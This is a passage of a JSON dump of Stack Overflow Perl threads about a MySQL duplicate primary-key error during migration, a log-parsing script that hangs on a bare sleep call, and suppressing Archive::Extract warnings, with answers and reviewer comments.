"comment_id": 58335213, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/103072/discussion-between-neuhaus-and-ashu\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "is_accepted": false, "score": 0, "last_activity_date": 1455104547, "last_edit_date": 1455104547, "creation_date": 1455098524, "answer_id": 35312017, "question_id": 35309504, "link": "https://stackoverflow.com/questions/35309504/unique-key-error-as-duplicate-key-in-mysql-perl-script/35312017#35312017", "title": "Unique key error as duplicate key in mysql perl script", "body": "<p>You can't have two rows with the same primary key.\nIt appears that you have two rows with CONN_ID = 10560 and PWORD = ??? in your data set.</p>\n\n<p>Remove the primary key or clean up your data (get rid of the rows with identical primary keys).</p>\n\n<p>Another possible cause of the problem is the <code>SELECT *</code> and the <code>INSERT INTO db1 VALUES ...</code>. You should <em>always</em> name the columns you want to retrieve and insert to avoid problems with column order etc.</p>\n\n<p>I saw that the table schema has</p>\n\n<pre><code>PRIMARY KEY (`CONN_ID`,`KEYWORD`)\n</code></pre>\n\n<p>which is different from</p>\n\n<pre><code>PRIMARY KEY (`CONN_ID`,`PWORD`)\n</code></pre>\n\n<p>PS: This question isn't really perl-related as-is.</p>\n"}], "owner": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 597, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1455104547, "creation_date": 1455090453, "last_edit_date": 1455093077, "question_id": 35309504, "link": "https://stackoverflow.com/questions/35309504/unique-key-error-as-duplicate-key-in-mysql-perl-script", "title": "Unique key error as duplicate key in mysql perl script", "body": "<p>I have one sql table, which has Primary key which is combination of two columns of same table as shown below:</p>\n\n<pre><code>PRIMARY KEY (`CONN_ID`,`PWORD`)\n</code></pre>\n\n<p>I am migrating the data from one database to another database using perl script.</p>\n\n<pre><code>$select = $dbh1-&gt;prepare(\"SELECT * FROM db2\");\n$insert = $dbh2-&gt;prepare(\"INSERT INTO db1 VALUES (?,?,?,?,?,?,?,?,?,?,?,?)\");\n\n$dbh2-&gt;do( 'SET FOREIGN_KEY_CHECKS=0;' );\n$select-&gt;execute;\nwhile (  my($PWORD,$CASE,$SPECIAL_XP,$ENA_TRANS,$TRANS,$DESC,$COMP,$SER,$CONN_ID,$S_ID,$EXT) = $select-&gt;fetchrow_array )\n{\n  $insert-&gt;execute($PWORD,$CASE,$SPECIAL_XP,$ENA_TRANS,$TRANS,$DESC,$COMP,$SER,$CONN_ID,$S_ID,$EXT,'NULL');\n}\n$dbh2-&gt;do( 'SET FOREIGN_KEY_CHECKS=1;' );\n</code></pre>\n\n<p>While running the script i am getting the following error, how to overcome that error and copy the data without any discrepancies.</p>\n\n<pre><code>DBD::mysql::st execute failed: Duplicate entry '10560-???' for key 'PRIMARY' at ./upgrade.sh.\n</code></pre>\n\n<p>Table Schema:</p>\n\n<pre><code>CREATE TABLE `MDB_KEYWORD` (\n`PWORD` varchar(255) NOT NULL,\n`CASE` char(1) DEFAULT NULL,\n`SPECIAL_XP` char(1) DEFAULT NULL,\n`ENA_TRANS` char(1) DEFAULT NULL,\n`TRANS` varchar(300) DEFAULT NULL,\n `DESC` varchar(500) DEFAULT NULL,\n`COMP` blob,\n`SER` bigint(20) NOT NULL,\n`CONN_ID` bigint(20) NOT NULL,\n`S_ID` bigint(20) DEFAULT NULL,\n`EXT` bigint(20) DEFAULT NULL,\n`U_LIST` char(1) DEFAULT NULL,\nPRIMARY KEY (`CONN_ID`,`KEYWORD`),\nKEY `FK_KEYWORD_SERVICECONN` (`SER`),\nKEY `FK_KEYWORD_SERVICE` (`S_ID`),\nKEY `FK_KEYWORD_EXTID` (`EXT`),\nCONSTRAINT `FK_KEYWORD_DRIVERCONN` FOREIGN KEY (`CONN_ID`) REFERENCES     `PDB_PROFILE` (`PR_ID`),\nCONSTRAINT `FK_KEYWORD_EXTID` FOREIGN KEY (`EXT_ID`) REFERENCES `PDB_PROFILE` (`PR_ID`),\nCONSTRAINT `FK_KEYWORD_SERVICE` FOREIGN KEY (`S_ID`) REFERENCES `PDB_PROFILE` (`PR_ID`),\nCONSTRAINT `FK_KEYWORD_SERVICECONN` FOREIGN KEY (`SER`) REFERENCES `PDB_PROFILE` (`PR_ID`)\n</code></pre>\n\n<p>) ENGINE=InnoDB DEFAULT CHARSET=latin1;</p>\n\n<p>The only difference between the tow tables is :</p>\n\n<p>ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;  DB1</p>\n\n<p>ENGINE=InnoDB DEFAULT CHARSET=latin1;  DB2</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 188064, "user_id": 635608, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oIJia.png?s=128&g=1", "display_name": "Mat", "link": "https://stackoverflow.com/users/635608/mat"}, "edited": false, "score": 1, "creation_date": 1455088218, "post_id": 35308883, "comment_id": 58327320, "body": "<code>$then - ($tdst - $ndst) * 60 * 60 ;</code> looks like a typo."}, {"owner": {"reputation": 4514, "user_id": 4248931, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HijcJ.png?s=128&g=1", "display_name": "serenesat", "link": "https://stackoverflow.com/users/4248931/serenesat"}, "edited": false, "score": 4, "creation_date": 1455088301, "post_id": 35308883, "comment_id": 58327356, "body": "Always use <code>use warnings;</code> and <code>use strict;</code> in Perl code."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1455088386, "post_id": 35308883, "comment_id": 58327408, "body": "You don&#39;t seem to have <code>use strict;</code> or <code>use warnings;</code> in use.  You aren&#39;t explicitly checking file open errors, nor are you using <code>use autodie;</code>.  Those are potential problems.  Basic debugging suggests you should be printing out lines as they&#39;re read, and then fields after they&#39;re split, to make sure your program is getting what you expect."}, {"owner": {"reputation": 4514, "user_id": 4248931, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HijcJ.png?s=128&g=1", "display_name": "serenesat", "link": "https://stackoverflow.com/users/4248931/serenesat"}, "edited": false, "score": 0, "creation_date": 1455088516, "post_id": 35308883, "comment_id": 58327469, "body": "<code>textfile</code> is a wrong filehandle name in <code>open</code> line. It should be <code>TEXTFILE</code> or better lexical filehandle <code>$textfile</code>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 4514, "user_id": 4248931, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HijcJ.png?s=128&g=1", "display_name": "serenesat", "link": "https://stackoverflow.com/users/4248931/serenesat"}, "edited": false, "score": 1, "creation_date": 1455088571, "post_id": 35308883, "comment_id": 58327497, "body": "@serenesat: <code>textfile</code> is a old-style non-lexical filehandle (like <code>STDERR</code>, <code>STDOUT</code>, <code>STDIN</code>), but legitimate.  Conventionally, they&#39;re capitalized, but that&#39;s convention, not necessity \u2014 AFAICR."}, {"owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "reply_to_user": {"reputation": 188064, "user_id": 635608, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oIJia.png?s=128&g=1", "display_name": "Mat", "link": "https://stackoverflow.com/users/635608/mat"}, "edited": false, "score": 0, "creation_date": 1455088665, "post_id": 35308883, "comment_id": 58327553, "body": "@Mat, it&#39;s giving the results i want thou."}, {"owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "reply_to_user": {"reputation": 4514, "user_id": 4248931, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HijcJ.png?s=128&g=1", "display_name": "serenesat", "link": "https://stackoverflow.com/users/4248931/serenesat"}, "edited": false, "score": 0, "creation_date": 1455088677, "post_id": 35308883, "comment_id": 58327559, "body": "@serenesat , ty for the heads up"}, {"owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1455088707, "post_id": 35308883, "comment_id": 58327580, "body": "@JonathanLeffler,i&#39;ll give it a try. a sec"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1455088776, "post_id": 35308883, "comment_id": 58327619, "body": "Any further commentary is hard \u2014 what you show is not an MCVE (<a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>), and you&#39;ve not shown any (minimized) sample data that triggers the problem."}, {"owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1455089061, "post_id": 35308883, "comment_id": 58327760, "body": "@JonathanLeffler, ty mate will do better. Now when i use strict, too many explicit.. need to add my. but literally the count++ just hang."}, {"owner": {"reputation": 188064, "user_id": 635608, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oIJia.png?s=128&g=1", "display_name": "Mat", "link": "https://stackoverflow.com/users/635608/mat"}, "edited": false, "score": 0, "creation_date": 1455089114, "post_id": 35308883, "comment_id": 58327783, "body": "@Jeeva&#39;sPanorama: that line doesn&#39;t do anything. If that&#39;s what you want, fine, but you might as well remove it."}, {"owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "reply_to_user": {"reputation": 188064, "user_id": 635608, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oIJia.png?s=128&g=1", "display_name": "Mat", "link": "https://stackoverflow.com/users/635608/mat"}, "edited": false, "score": 0, "creation_date": 1455089570, "post_id": 35308883, "comment_id": 58327982, "body": "@Mat, true actually i kept there for some equation of the time for logging issue"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "edited": false, "score": 0, "creation_date": 1455089742, "post_id": 35309271, "comment_id": 58328082, "body": "thx for the effort. But I think i just found the warnings for the perl  Use of uninitialized value in print at test.pl line 82, &lt;textfile&gt; line 46256. Use of uninitialized value in print at test.pl line 83, &lt;textfile&gt; line 46256. Use of uninitialized value in print at test.pl line 84, &lt;textfile&gt; line 46256.  Literally when end line i&#39;m printing.. It doesn&#39;t show anything."}, {"owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "edited": false, "score": 0, "creation_date": 1455090018, "post_id": 35309271, "comment_id": 58328208, "body": "I think i found the solution"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 2, "last_activity_date": 1455089753, "last_edit_date": 1455089753, "creation_date": 1455089573, "answer_id": 35309271, "question_id": 35308883, "link": "https://stackoverflow.com/questions/35308883/perl-hung-when-asked-for-count/35309271#35309271", "title": "Perl hung when asked for count ++", "body": "<p>I think your problem will be this :</p>\n\n<pre><code>sleep;  \n</code></pre>\n\n<p>Because from the <a href=\"http://perldoc.perl.org/functions/sleep.html\" rel=\"nofollow\">documentation</a> :</p>\n\n<blockquote>\n  <p>Causes the script to sleep for (integer) EXPR seconds, or forever if no argument is given.\u00a0</p>\n</blockquote>\n\n<p>But whilst we are at it:</p>\n\n<ul>\n<li>Use <code>strict</code> and <code>warnings</code></li>\n<li>3 argument <code>open</code> with lexical filehandles is better style. </li>\n<li>Check your return codes from <code>open</code>.</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "is_accepted": false, "score": -3, "last_activity_date": 1455090185, "creation_date": 1455090185, "answer_id": 35309446, "question_id": 35308883, "link": "https://stackoverflow.com/questions/35308883/perl-hung-when-asked-for-count/35309446#35309446", "title": "Perl hung when asked for count ++", "body": "<p>This is the solution.\nI replace the variable my count100 =0; to count100 =0; then it worked and it's giving the results i wanted</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\n\nprint \"What are the month of logs you're looking to start?\\n\";\nmy $opt1 = &lt;&gt;;\nchomp($opt1);\nprint \"What are the month of logs you're looking to end search?\\n\";\nmy $opt2 = &lt;&gt;;\nchomp($opt2);\nprint \"What are the day of logs you're looking to start?\\n\";\nmy $opt3 = &lt;&gt;;\nchomp($opt3);\nprint \"What are the day of logs you're looking to end search?\\n\";\nmy $opt4 = &lt;&gt;;\nchomp($opt4);\n\nfor($month=$opt1;$month&lt;$opt2;$month++) \n{\n    my $mymonth = sprintf '%02d', $month;\n\nfor($myDay=$opt3;$myDay&lt;$opt4;$myDay++)\n{\n    my $myDay2 = sprintf '%02d', $myDay;\n\n#---------------------------------------------------------\n# SET YESTERDAY DATE\n# ----------------------\nmy $now = defined $_[0] ? $_[0] : time;\nmy $then = $now - 60*60*24*$myDay;\nmy $ndst = (localtime $now)[8] &gt; 0;\nmy $tdst = (localtime $then)[8] &gt; 0;\n\n$then - ($tdst - $ndst) * 60 * 60 ;\n\nmy ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime($then);\nmy $yesterday =\"16\".$mymonth.$myDay2;\nmy $today =$yesterday;\nprint $today.\"\\n\";\n\n$count100 = 0;\n$count200 = 0;\n$count500 = 0;\n\n\nprint \"\\nCount total charging 200, 500 DN\".$today.\".log\\n\";\nopen (textfile,\"C:\\\\VasBoss\\\\Log\\\\didi\\\\DN\".$today.\".log\");\n\nopen (MYFILE, \"&gt;&gt; 2TK.txt\");\nopen (MYFILE2, \"&gt;&gt; 5TK.txt\");\nopen (MYFILE3, \"&gt;&gt; 1TK.txt\");\n\nwhile (&lt;textfile&gt;)\n{\n    ($MobileNo,$SubscriberID,$Shortcode,$Telco,$MO_time,$MO_id,$TransactionType,$Language,$Content,$checkprice,$ChargeStatus,$Contentmsg,$ChatDisabled)= split(/,/);\n    ($date,$MobileNo1)  = split(/\\&gt;/,$MobileNo);\n    ($MobileNo2,$MobileNo3)  = split(/\\=/,$MobileNo1);\n    ($Content1,$Content2)  = split(/\\&gt;/,$Content);\n    if(($checkprice =~ /200$/i ) &amp;&amp; ($Content2 =~ /=0$/i))\n    {       \n        print MYFILE $MobileNo3.\"\\n\";\n         $count200++;\n\n    }\n    if(($checkprice =~ /500$/i ) &amp;&amp; ($Content2 =~ /=0$/i))\n    {       \n        print MYFILE2 $MobileNo3.\"\\n\";\n         $count500++;\n    }\n\n    if(($checkprice =~ /100$/i ) &amp;&amp; ($Content2 =~ /=0$/i))\n    {       \n        print MYFILE3 $MobileNo3.\"\\n\";\n        $count100++;\n    }\n}\n\n}\n\n}\n\nprint $count100.\"\\n\";\nprint $count200.\"\\n\";\nprint $count500.\"\\n\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1455119682, "creation_date": 1455119682, "answer_id": 35319831, "question_id": 35308883, "link": "https://stackoverflow.com/questions/35308883/perl-hung-when-asked-for-count/35319831#35319831", "title": "Perl hung when asked for count ++", "body": "<pre><code>print $count100;   &lt;-- You think it hung before here,\nprint $count200;\nprint $count500;\nsleep;             &lt;-- but it hung here as requested.\n</code></pre>\n\n<p>You didn't see the output of the <code>print</code> statements because STDOUT starts off line-buffered<sup>[1]</sup>, meaning it will only send the text to <code>print</code> when it encounters a newline.</p>\n\n<p>To force any pending output to be sent, add the following before <code>sleep</code>.</p>\n\n<pre><code>select()-&gt;flush();\n</code></pre>\n\n<p>But you probably meant to print a newline, so what you should really add is the following:</p>\n\n<pre><code>print \"\\n\";\n</code></pre>\n\n<p>Note that <code>sleep</code> without arguments sleeps indefinitely<sup>[2]</sup>, so I'm not sure why you're using that at all.</p>\n\n<hr>\n\n<ol>\n<li><p>When connected to a terminal. It starts off block-buffered otherwise.</p></li>\n<li><p>Or until a signal comes in if you have signal handlers defined</p></li>\n</ol>\n"}], "owner": {"reputation": 1, "user_id": 5886217, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5Q-5G2qWAMk/AAAAAAAAAAI/AAAAAAAAABU/iZkrfZhwWlM/photo.jpg?sz=128", "display_name": "Jeeva&#39;s Panorama", "link": "https://stackoverflow.com/users/5886217/jeevas-panorama"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "answer_count": 3, "score": -3, "last_activity_date": 1455119682, "creation_date": 1455088047, "last_edit_date": 1455090131, "question_id": 35308883, "link": "https://stackoverflow.com/questions/35308883/perl-hung-when-asked-for-count", "title": "Perl hung when asked for count ++", "body": "<p>I'm writing a code for me to extract some information from the log.\nBut each time I run, the Perl hangs and my text file doesn't increase in size a.k.a hang.</p>\n\n<pre><code>#!/usr/bin/perl\nprint \"What are the month of logs you're looking to start?\\n\";\n$opt1 = &lt;&gt;;\nchomp($opt1);\nprint \"What are the month of logs you're looking to end search?\\n\";\n$opt2 = &lt;&gt;;\nchomp($opt2);\nprint \"What are the day of logs you're looking to start?\\n\";\n$opt3 = &lt;&gt;;\nchomp($opt3);\nprint \"What are the day of logs you're looking to end search?\\n\";\n$opt4 = &lt;&gt;;\nchomp($opt4);\n\nfor($month=$opt1;$month&lt;$opt2;$month++) \n{\nmy $mymonth = sprintf '%02d', $month;\n\nfor($myDay=$opt3;$myDay&lt;$opt4;$myDay++)\n{\nmy $myDay2 = sprintf '%02d', $myDay;\n\n#---------------------------------------------------------\n# SET YESTERDAY DATE\n# ----------------------\nmy $now = defined $_[0] ? $_[0] : time;\nmy $then = $now - 60*60*24*$myDay;\nmy $ndst = (localtime $now)[8] &gt; 0;\nmy $tdst = (localtime $then)[8] &gt; 0;\n\n$then - ($tdst - $ndst) * 60 * 60 ;\n\nmy ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime($then);\nmy $yesterday =\"16\".$mymonth.$myDay2;\nmy $today =$yesterday;\nprint $today.\"\\n\";\n\nmy $count100 = 0;\nmy $count200 = 0;\nmy $count500 = 0;\n\n\nprint \"\\nCount total charging 200, 500 DN\".$today.\".log\\n\";\nopen (textfile,\"C:\\\\VasBoss\\\\Log\\\\didi\\\\DN\".$today.\".log\");\n\nopen (MYFILE, \"&gt;&gt; 2TK.txt\");\nopen (MYFILE2, \"&gt;&gt; 5TK.txt\");\nopen (MYFILE3, \"&gt;&gt; 1TK.txt\");\n\nwhile (&lt;textfile&gt;)\n{\n($MobileNo,$SubscriberID,$Shortcode,$Telco,$MO_time,$MO_id,$TransactionType,$Language,$Content,$checkprice,$ChargeStatus,$Contentmsg,$ChatDisabled)= split(/,/);\n($date,$MobileNo1)  = split(/\\&gt;/,$MobileNo);\n($MobileNo2,$MobileNo3)  = split(/\\=/,$MobileNo1);\n($Content1,$Content2)  = split(/\\&gt;/,$Content);\nif(($checkprice =~ /200$/i ) &amp;&amp; ($Content2 =~ /=0$/i))\n{       \n    print MYFILE $MobileNo3.\"\\n\";\n    $count200++;\n\n}\nif(($checkprice =~ /500$/i ) &amp;&amp; ($Content2 =~ /=0$/i))\n{       \n    print MYFILE2 $MobileNo3.\"\\n\";\n    $count500++;\n}\n\nif(($checkprice =~ /100$/i ) &amp;&amp; ($Content2 =~ /=0$/i))\n{       \n    print MYFILE3 $MobileNo3.\"\\n\";\n    $count100++;\n}\n}\nprint $count100;\nprint $count200;\nprint $count500;\nsleep;\n}\n}\n</code></pre>\n\n<p>Edit , I've found the solution.\nI've found that the global explicit variable clashing my compilation.</p>\n"}, {"tags": ["perl", "extract", "archive"], "comments": [{"owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "edited": false, "score": 0, "creation_date": 1455101978, "post_id": 35308014, "comment_id": 58335525, "body": "You should have read the documentation of Archive::Extract before posting the question."}], "answers": [{"tags": [], "owner": {"reputation": 3334, "user_id": 4473327, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hP14q.jpg?s=128&g=1", "display_name": "neuhaus", "link": "https://stackoverflow.com/users/4473327/neuhaus"}, "is_accepted": true, "score": 0, "last_activity_date": 1455101917, "creation_date": 1455101917, "answer_id": 35313303, "question_id": 35308014, "link": "https://stackoverflow.com/questions/35308014/perl-disable-archiveextract-erro-rmessages/35313303#35313303", "title": "Perl disable Archive::Extract erro rmessages", "body": "<p>Set <code>$Archive::Extract::WARN</code> to false.</p>\n\n<p>The documentation states:</p>\n\n<blockquote>\n  <p>This variable controls whether errors encountered internally by Archive::Extract should be carp'd or not.\n  Set to false to silence warnings. Inspect the output of the error() method manually to see what went wrong.</p>\n</blockquote>\n"}], "owner": {"reputation": 165, "user_id": 5906674, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Hd67ZlIsJlM/AAAAAAAAAAI/AAAAAAAABho/KfUFh0zWTY0/photo.jpg?sz=128", "display_name": "Mani Vannan", "link": "https://stackoverflow.com/users/5906674/mani-vannan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 35313303, "answer_count": 1, "score": 0, "last_activity_date": 1455101917, "creation_date": 1455084336, "last_edit_date": 1455085893, "question_id": 35308014, "link": "https://stackoverflow.com/questions/35308014/perl-disable-archiveextract-erro-rmessages", "title": "Perl disable Archive::Extract erro rmessages", "body": "<p>In <code>Perl</code> I have below lines </p>\n\n<pre><code>my $hu_unzip = Archive::Extract-&gt;new( archive =&gt; $dest_path.'\\one.zip' );\nmy $ok1 = $hu_unzip-&gt;extract( to =&gt; $dest_path );\nmy $rse_unzip = Archive::Extract-&gt;new( archive =&gt; $dest_path.'\\two.zip' );\nmy $ok2 = $rse_unzip-&gt;extract( to =&gt; $dest_path );\n</code></pre>\n\n<p>But when i run i am getting below message but still <code>unzip</code> happens properly.</p>\n\n<blockquote>\n  <p>format error: bad signature: 0x00000a00 at offset -1 in file E:\\Folder\\New\\one.zip Archive::Zip::_readSignature('IO::File=GLOB(0x23f9644)'</p>\n</blockquote>\n\n<p>Here i don't want this <code>error</code> to be printed. \nSo how shall i proceed </p>\n"}, {"tags": ["perl", "perl-module"], "answers": [{"comments": [{"owner": {"reputation": 69, "user_id": 2925298, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/d5e38aa6840ac8f36c18087599858da6?s=128&d=identicon&r=PG&f=1", "display_name": "user2925298", "link": "https://stackoverflow.com/users/2925298/user2925298"}, "edited": false, "score": 0, "creation_date": 1455082631, "post_id": 35307431, "comment_id": 58324994, "body": "It is giving error  &quot;Global symbol &quot;$file&quot; requires explicit package name at D:\\coding\\new.pl line 56. Execution of D:\\coding\\new.pl aborted due to compilation errors.&quot;"}, {"owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "reply_to_user": {"reputation": 69, "user_id": 2925298, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/d5e38aa6840ac8f36c18087599858da6?s=128&d=identicon&r=PG&f=1", "display_name": "user2925298", "link": "https://stackoverflow.com/users/2925298/user2925298"}, "edited": false, "score": 0, "creation_date": 1455083174, "post_id": 35307431, "comment_id": 58325204, "body": "Fixed. <code>$file</code> was the var holding the filename but I accidentely deleted it. I&#39;ve changed the var name to <code>$filename</code> to be more explicit. Any time you refer to a literal name more than once (like &#39;temp.txt&#39;) it&#39;s best to put it in a variable so you don&#39;t need to repeat yourself."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1455085052, "post_id": 35307431, "comment_id": 58325929, "body": "Should always catch errors on open: <code>open my $ fh,  &#39;&lt;&#39;, $filename or die $!;</code>"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1455085280, "post_id": 35307431, "comment_id": 58326009, "body": "Also, it&#39;s a lot more memory efficient to loop over the fIle a line at a time instead of slurping the whole thing into an array where possible (it most often is): <code>while (&lt;$fh&gt;){ print; }</code>"}, {"owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "edited": false, "score": 0, "creation_date": 1455089045, "post_id": 35307431, "comment_id": 58327750, "body": "stevieb: is certainly not how I&#39;d write the script, just modernised op&#39;s script."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1455126821, "post_id": 35307431, "comment_id": 58353611, "body": "If it&#39;s not how you would write the script, why did you post it? And why would you go to the trouble of teaching them about strict, warnings, lexical filehandles, and 3-arg <code>open</code>, but stop short of teaching them to check the success of <code>open</code>?"}], "tags": [], "owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "is_accepted": true, "score": 0, "last_activity_date": 1455109850, "last_edit_date": 1455109850, "creation_date": 1455081680, "answer_id": 35307431, "question_id": 35307238, "link": 